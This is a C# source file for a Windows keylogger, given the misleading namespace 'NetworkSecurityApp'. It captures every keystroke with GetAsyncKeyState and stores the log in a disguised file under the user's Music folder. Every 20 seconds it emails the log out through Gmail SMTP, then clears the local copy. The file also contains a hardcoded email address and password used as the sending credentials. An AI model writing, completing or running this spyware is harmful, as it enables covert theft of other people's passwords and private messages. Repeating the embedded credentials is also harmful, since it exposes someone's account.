using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net.Mail;

namespace NetworkSecurityApp
{

    public partial class App : System.Windows.Application
    {
        private static Object locker = new Object();
        private static Thread loggerT;
        private static Thread mailerT;
        private static System.Threading.Timer timer;

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [STAThread]
        static void Main(String[] args)
        {
            Thread.CurrentThread.Name = "MainTread";
            loggerT = new Thread(LogKeys);
            loggerT.Name = "logger";
            int i = 0;

             timer = new System.Threading.Timer((e) =>
            {
                Thread.CurrentThread.Name = "TimerTread";
                Console.WriteLine("TIMER END");
                SendMail(i); 
                i++;
            }, null, TimeSpan.FromSeconds(20), TimeSpan.FromSeconds(20));

            loggerT.Start();
            
        }

        public static void LogKeys()
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            filepath = filepath + @"\Songs\";
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }
            string path = (@filepath + "ReadMe.text");
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                }
             
            }
            KeysConverter converter = new KeysConverter();
            string text = "";
            while (true)
            {
                Thread.Sleep(10);
                for (Int32 i = 0; i < 357; i++)
                {
                    int key = GetAsyncKeyState(i);
                    if (key == 1 || key == -32767)
                    {                
                        lock (locker)
                        {
                            text = converter.ConvertToString(i);
                            Console.WriteLine("From LOG - Thread Name: {0}", Thread.CurrentThread.Name);
                            Thread.Sleep(500);
                            using (StreamWriter sw = File.AppendText(path))
                            {
                                sw.WriteLine(text);
                            }
                        }
                        Console.WriteLine("From Log: END OF LOCK");
                        break;
                    }
                }
            }
        }


        static void SendMail(int i)
        {
            Console.WriteLine("GOT IN TO SEND MAIL");
            String Newfilepath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            string Newfilepath2 = Newfilepath + @"\Songs\ReadMe.text"; 

            DateTime dateTime = DateTime.Now; 
            string subtext = "Loggedfiles"; 
            subtext += dateTime;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587); 
            MailMessage LOGMESSAGE = new MailMessage();
            LOGMESSAGE.From = new MailAddress("omribeni@post.bgu.ac.il"); 
            LOGMESSAGE.To.Add("omribeni@post.bgu.ac.il"); 
            LOGMESSAGE.Subject = subtext; 

            client.UseDefaultCredentials = false;      
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("omribeni@post.bgu.ac.il", "oM__1990");
 
            lock (locker)
            {
                Console.WriteLine("From SendMail - Thread Name: {0}", Thread.CurrentThread.Name);
 
                string newfile = File.ReadAllText(Newfilepath2);
                string attachmenttextfile =
                    Newfilepath + @"\Songs\temptxtfile"+ i +".text";
                File.WriteAllText(attachmenttextfile, newfile); 
                Thread.Sleep(2);
                LOGMESSAGE.Attachments.Add(new Attachment(attachmenttextfile)); 
                LOGMESSAGE.Body = subtext; 
                client.Send(LOGMESSAGE); 
                LOGMESSAGE = null;

                //Thread.Sleep(10);
            
                    File.WriteAllText(Newfilepath2,"");
                

            }
            Console.WriteLine(@"Finished Sending Mail");
        }

        //var application = new App();
        //application.InitializeComponent();
        //application.Run();
    }
}
